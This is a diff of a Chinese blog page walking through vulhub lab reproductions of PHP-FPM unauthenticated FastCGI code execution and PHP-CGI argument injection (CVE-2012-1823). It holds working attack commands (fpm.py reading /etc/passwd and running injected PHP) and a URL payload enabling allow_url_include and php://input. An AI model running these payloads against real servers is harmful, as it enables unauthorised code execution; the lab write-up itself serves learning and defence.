@@ -437,17 +437,22 @@
 <p>参考P牛文章：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
 <p><strong>2、 漏洞复现</strong></p>
 <p>使用vulhub实验环境，启动实验环境。</p>
-<pre><code>cd /vulhub/fpm
-docker-compose build &amp;&amp; docker-compose up -d</code></pre><p><strong>EXP</strong>:<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/vulhub/fpm</span></span><br><span class="line">docker-compose build &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><strong>EXP</strong>:<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
 <p>在攻击机使用命令python fpm.py 192.168.237.136 /etc/passwd，观察返回结果。</p>
 <p><a href="https://image.3001.net/images/20181216/1544955569_5c1626b181057.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955569_5c1626b181057.png!small" alt="img"></a></p>
 <p>由于访问非*.PHP文件，所以返回结果403。</p>
 <p>使用命令执行一个默认存在的 php 文件。</p>
-<pre><code>python fpm.py 192.168.237.136 /usr/local/lib/php/PEAR.php</code></pre><p><a href="https://image.3001.net/images/20181216/1544955581_5c1626bd94566.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955581_5c1626bd94566.png!small" alt="img"></a></p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fpm.py <span class="number">192.168</span>.<span class="number">237.136</span> /usr/local/<span class="class"><span class="keyword">lib</span>/<span class="title">php</span>/<span class="title">PEAR</span>.<span class="title">php</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><a href="https://image.3001.net/images/20181216/1544955581_5c1626bd94566.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955581_5c1626bd94566.png!small" alt="img"></a></p>
 <p>利用命令进行任意命令执行复现。</p>
-<pre><code>python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `pwd`; ?&gt;&#39;
-python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `ifconfig`; ?&gt;&#39;
-python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `ls`; ?&gt;&#39;</code></pre><p><a href="https://image.3001.net/images/20181216/1544955594_5c1626ca98c2c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955594_5c1626ca98c2c.png!small" alt="img"></a></p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python fpm.py <span class="number">192.168</span>.<span class="number">139.129</span> /usr/local/<span class="class"><span class="keyword">lib</span>/<span class="title">php</span>/<span class="title">PEAR</span>.<span class="title">php</span>-<span class="title">c</span> '&lt;?<span class="title">php</span> <span class="title">echo</span> `<span class="title">pwd</span>`;</span> ?&gt;<span class="string">'</span></span><br><span class="line"><span class="string">python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c '</span>&lt;?php echo <span class="string">`ifconfig`</span>; ?&gt;<span class="string">'</span></span><br><span class="line"><span class="string">python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c '</span>&lt;?php echo <span class="string">`ls`</span>; ?&gt;<span class="string">'</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20181216/1544955594_5c1626ca98c2c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955594_5c1626ca98c2c.png!small" alt="img"></a></p>
 <p><strong>3、 漏洞修复</strong></p>
 <p>更改默认端口</p>
 <h3 id="（二）-PHPCGI远程代码执行"><a href="#（二）-PHPCGI远程代码执行" class="headerlink" title="（二） PHPCGI远程代码执行"></a>（二） PHPCGI远程代码执行</h3><p><strong>1、 漏洞简介及成因</strong></p>
@@ -456,13 +461,9 @@ python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `
 <p><a href="http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/" target="_blank" rel="noopener">http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/</a><br>p牛讲的很详细：<a href="https://vulhub.org/#/environments/php/CVE-2012-1823/" target="_blank" rel="noopener">https://vulhub.org/#/environments/php/CVE-2012-1823/</a></p>
 <p><strong>2、 漏洞复现</strong></p>
 <p>cgi模式下有如下一些参数可用：</p>
-<pre><code>-c 指定php.ini文件的位置
--n 不要加载php.ini文件
--d 指定配置项
--b 启动fastcgi进程
--s 显示文件源码
--T 执行指定次该文件
--h和-? 显示帮助</code></pre><p>通过使用<code>-d</code>指定<code>auto_prepend_file</code>来制造任意文件包含漏洞，执行任意代码：<br><code>auto_prepend_file</code>与<code>auto_append_file</code>:将文件require到所有页面的顶部与底部。<br>空格用<code>+</code>或<code>%20</code>代替，<code>=</code>用url编码代替。<br>payload：<code>-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</code></p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-c 指定php.ini文件的位置</span></span><br><span class="line"><span class="deletion">-n 不要加载php.ini文件</span></span><br><span class="line"><span class="deletion">-d 指定配置项</span></span><br><span class="line"><span class="deletion">-b 启动fastcgi进程</span></span><br><span class="line"><span class="deletion">-s 显示文件源码</span></span><br><span class="line"><span class="deletion">-T 执行指定次该文件</span></span><br><span class="line"><span class="deletion">-h和-? 显示帮助</span></span><br></pre></td></tr></table></figure>
+
+<p>通过使用<code>-d</code>指定<code>auto_prepend_file</code>来制造任意文件包含漏洞，执行任意代码：<br><code>auto_prepend_file</code>与<code>auto_append_file</code>:将文件require到所有页面的顶部与底部。<br>空格用<code>+</code>或<code>%20</code>代替，<code>=</code>用url编码代替。<br>payload：<code>-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</code></p>
 <p>使用vulhub实验环境，启动环境。</p>
 <p>访问<a href="http://192.168.139.129:8080/index.php。" target="_blank" rel="noopener">http://192.168.139.129:8080/index.php。</a></p>
 <p><a href="https://image.3001.net/images/20181216/1544955605_5c1626d552e60.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955605_5c1626d552e60.png!small" alt="img"></a></p>
